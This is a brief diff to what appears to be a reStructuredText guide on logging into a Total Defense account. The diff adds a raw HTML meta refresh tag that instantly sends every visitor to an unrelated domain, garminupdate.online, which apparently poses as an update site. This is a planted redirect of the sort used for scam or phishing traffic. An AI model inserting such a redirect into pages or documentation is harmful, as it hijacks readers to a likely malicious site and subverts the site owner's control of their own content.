@@ -1,3 +1,6 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
 
 How To Login Total Defense Account: A Complete Guide
 
